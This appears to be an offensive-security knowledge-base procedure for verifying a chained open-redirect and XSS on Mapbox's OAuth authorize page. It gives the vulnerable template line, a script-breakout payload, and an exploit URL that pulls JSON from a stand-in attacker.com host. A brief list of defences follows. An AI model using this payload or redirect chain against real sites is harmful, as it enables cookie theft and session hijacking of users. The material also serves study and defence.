---
tags:
  - xss
  - javascript
type: procedure
tools:
  - '[[tools/Chrome]]'
  - '[[tools/Safari]]'
  - '[[tools/Firefox]]'
  - '[[tools/Internet-Explorer-11]]'
  - '[[tools/Edge]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:31.324Z'
skill_level: beginner
impact_level: high
detection_risk: high
sub_techniques: []
id: 1ae2f4fc-3f92-437d-a429-a5780682e01f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-Execution-via-Browser

## Summary

This procedure observes the execution of the injected JavaScript from the chained open redirect and XSS, confirming arbitrary code runs in the Mapbox domain context, such as alerting the document domain.

## Description

After the redirect fetches the JSON, the authorize page inserts obj.authorize_url into the form action: <form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' ...>. The payload breaks it to '><script>alert(document.domain);</script>', injecting and executing the script. Tested across browsers. Expected outcome: JS execution allowing theft of cookies, session hijacking, etc.

## Requirements

1. Successful completion of prior procedures
2. Victim-like browser session
3. Developer tools enabled for inspection

## Defense

Defensive measures and detection strategies:

- HTML-escape all dynamic content in templates (e.g., use <%= escape(obj.authorize_url) %>)
- Implement CSP to block inline scripts
- Monitor for unexpected alerts or JS errors in OAuth flows

## Objectives

1. Confirm payload execution
2. Validate domain context
3. Assess impact potential

## Instructions

### Step 1: Load and Observe in Browser

**Context**: Use a supported browser to load the exploit URL and watch for execution.

Open the crafted authorize URL in [[tools/Chrome]] (or Safari, Firefox, IE11, Edge):

Navigate to https://www.mapbox.com/authorize/?redirect_uri=https://attacker.com/malicious.json.

> Expected output: After redirect and fetch, an alert pops up displaying 'www.mapbox.com'. Check console for script execution.

### Step 2: Inspect Network and DOM

**Context**: Verify the chain in dev tools.

In browser dev tools:

- Network tab: Confirm 302, JSON fetch with CORS headers.
- Elements tab: See broken form tag with injected <script>.

> Success: Script executes, proving XSS in Mapbox context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Chrome]]
- [[tools/Safari]]
- [[tools/Firefox]]
- [[tools/Internet-Explorer-11]]
- [[tools/Edge]]

## Tags

- [[xss]]
- [[js-execution]]
